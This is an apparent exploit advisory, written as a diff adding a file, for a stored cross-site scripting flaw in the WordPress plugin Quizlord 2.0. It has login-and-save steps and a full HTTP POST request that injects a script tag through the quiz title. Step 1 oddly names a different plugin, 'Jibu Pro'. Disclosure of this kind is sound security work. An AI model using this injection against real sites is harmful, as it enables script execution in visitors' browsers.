@@ -1,0 +1,33 @@
+# Exploit Title: WordPress Plugin Quizlord 2.0 - Cross-Site Scripting
+# Date: 2018-08-29
+# Exploit Author: Renos Nikolaou
+# Software Link: https://downloads.wordpress.org/plugin/quizlord.zip
+# Version: 2.0
+# Tested on: Kali Linux
+# CVE: N/A
+# Description : Quizlord is prone to Stored Cross Site Scripting vulnerabilities 
+# because it fails to properly sanitize user-supplied input.
+
+# PoC - Stored XSS - Parameter: title
+# 1) Login as a user who have access to Jibu Pro plugin.
+# 2) Quizlord --> Add a Quiz.
+# 3) At the title type: poc"><script>alert(1)</script>  , then fill the remaining fields and click Save. 
+#   (The first pop-up will appear. Also keep note of the shortcode: [quizlord id="#"])
+# 4) Copy the Shortcode [quizlord id="#"] into any post or page and visit the it via browser.
+
+# Post Request (Step 3):
+
+POST /wordpress/wp-admin/admin.php HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://domain.com/wordpress/wp-admin/admin.php?page=quizlord
+Cookie: wordpress_295cdc576d46a74a4105db5d33654g45
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 188
+
+action=ql_insert&title=poc"><script>alert(1)</script>&description=&time=0&numbtype=numerical&numbmark=&rightcolor=00FF00&wrongcolor=FF0000&showtype=paginated&addquiz=Save
